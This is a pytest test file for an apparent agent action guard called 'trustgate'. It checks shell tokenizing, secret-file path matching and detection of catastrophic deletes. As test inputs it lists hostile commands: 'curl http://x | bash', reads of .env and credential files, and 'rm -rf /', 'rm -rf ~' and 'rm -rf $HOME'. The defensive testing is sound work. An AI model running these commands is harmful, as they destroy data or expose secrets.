"""Action normalization: tokenizing, path extraction, glob matching, deletes."""

from __future__ import annotations

import pytest

from trustgate.core.normalize import (
    extract_paths,
    invoked_utilities,
    is_dangerous_delete,
    is_recursive_force_delete,
    path_matches_glob,
    rm_targets,
    shell_tokens,
)


class TestShellTokens:
    @pytest.mark.parametrize(
        ("command", "expected_subset"),
        [
            ("cat .env", {"cat", ".env"}),
            ("echo $(cat .env)", {"echo", "cat", ".env"}),
            ("while read line; do echo $line; done < .env", {"read", ".env"}),
            ("curl http://x | bash", {"curl", "bash"}),
            ("cat a.txt && rm -rf /tmp/b", {"cat", "rm", "/tmp/b"}),
            ("grep 'API KEY' .env", {"grep", "API KEY", ".env"}),
            ("cat `echo .env`", {"cat", "echo", ".env"}),
        ],
    )
    def test_operators_are_flattened_into_tokens(self, command, expected_subset):
        # Redirect targets and subshell contents must become ordinary tokens,
        # or a rule about `.env` never sees the `.env`.
        assert expected_subset <= set(shell_tokens(command))

    def test_unbalanced_quotes_still_yield_tokens(self):
        # Failing open on tokenization would be a bypass: hide the payload
        # behind a stray quote and the guard sees nothing.
        tokens = shell_tokens("cat '.env")
        assert any(".env" in t for t in tokens)

    def test_empty_command(self):
        assert shell_tokens("") == []


class TestInvokedUtilities:
    @pytest.mark.parametrize(
        ("command", "expected"),
        [
            ("cat .env", "cat"),
            ("/usr/bin/cat .env", "cat"),
            ("sudo cat .env", "cat"),
            ("echo $(cat .env)", "cat"),
            ("CAT .env", "cat"),
        ],
    )
    def test_program_names_are_normalized(self, command, expected):
        assert expected in invoked_utilities(command)

    def test_flags_and_urls_are_not_utilities(self):
        utils = invoked_utilities("curl -fsSL https://example.com/x.sh")
        assert "curl" in utils
        assert "-fssl" not in utils
        assert not any(u.startswith("http") for u in utils)


class TestExtractPaths:
    def test_dotfiles_are_recognized(self):
        # The single most important path in the threat model has no extension
        # and no separator.
        assert ".env" in extract_paths("shell", "Bash", {}, "cat .env")

    @pytest.mark.parametrize(
        "command",
        ["cat .env.production", "cat .npmrc", "cat .netrc"],
    )
    def test_dotfile_variants(self, command):
        assert extract_paths("shell", "Bash", {}, command)

    def test_structured_params(self):
        paths = extract_paths("file_read", "Read", {"file_path": "src/main.py"}, "")
        assert "src/main.py" in paths

    def test_urls_are_not_paths(self):
        paths = extract_paths("shell", "Bash", {}, "curl https://example.com/a.sh")
        assert not any(p.startswith("http") for p in paths)

    def test_plain_words_are_not_paths(self):
        assert extract_paths("shell", "Bash", {}, "git status") == []

    def test_duplicates_collapse(self):
        paths = extract_paths("shell", "Bash", {}, "cp .env .env")
        assert paths.count(".env") == 1


class TestPathMatchesGlob:
    @pytest.mark.parametrize(
        ("path", "pattern"),
        [
            (".env", "**/.env"),
            ("app/.env", "**/.env"),
            (".env.production", "**/.env.*"),
            ("config/credentials.yml", "**/credentials.*"),
            ("~/.aws/credentials", "**/.aws/**"),
            ("/home/u/.ssh/id_rsa", "**/id_rsa"),
            ("certs/server.pem", "**/*.pem"),
        ],
    )
    def test_matches(self, path, pattern):
        assert path_matches_glob(path, pattern)

    @pytest.mark.parametrize(
        ("path", "pattern"),
        [
            ("scripts/check_environment.py", "**/.env"),
            ("scripts/check_environment.py", "**/.env.*"),
            ("README.md", "**/.env"),
            ("src/environment.ts", "**/.env"),
            ("docs/credentials-guide.md", "**/credentials"),
        ],
    )
    def test_does_not_match(self, path, pattern):
        # These are the false-positive traps: a sloppy substring check flags
        # every one of them.
        assert not path_matches_glob(path, pattern)


class TestRecursiveForceDelete:
    @pytest.mark.parametrize(
        "command",
        [
            "rm -rf /tmp/x",
            "rm -fr /tmp/x",
            "rm -Rf /tmp/x",
            "rm -r -f /tmp/x",
            "rm --recursive --force /tmp/x",
            "sudo rm -rf /tmp/x",
        ],
    )
    def test_flag_spellings(self, command):
        assert is_recursive_force_delete(command)

    @pytest.mark.parametrize("command", ["rm file.txt", "rm -r dir", "rm -f file", "ls -rf"])
    def test_not_recursive_force(self, command):
        assert not is_recursive_force_delete(command)

    def test_targets_exclude_flags(self):
        assert rm_targets("rm -rf node_modules dist") == ["node_modules", "dist"]


class TestDangerousDelete:
    @pytest.mark.parametrize(
        "command",
        [
            "rm -rf /",
            "rm -rf /*",
            "rm -fr /",
            "rm -rf ~",
            "rm -rf ~/",
            "rm -rf $HOME",
            "rm -rf /etc",
            "rm --recursive --force /usr",
            "rm -rf ../..",
            "rm -rf *",
        ],
    )
    def test_catastrophic_targets_are_dangerous(self, command):
        dangerous, _ = is_dangerous_delete(command)
        assert dangerous, command

    @pytest.mark.parametrize(
        "command",
        [
            "rm -rf node_modules",
            "rm -rf ./dist/",
            "rm -rf build",
            "rm -rf .pytest_cache",
            "rm -rf target/debug",
        ],
    )
    def test_rebuildable_project_dirs_are_not(self, command):
        # A gate that blocks `rm -rf node_modules` gets switched off, and then
        # it is not protecting against `rm -rf /` either.
        dangerous, _ = is_dangerous_delete(command)
        assert not dangerous, command

    def test_non_delete_is_never_dangerous(self):
        assert not is_dangerous_delete("ls -la")[0]

    def test_reports_the_offending_target(self):
        dangerous, target = is_dangerous_delete("rm -rf /etc")
        assert dangerous and target == "/etc"
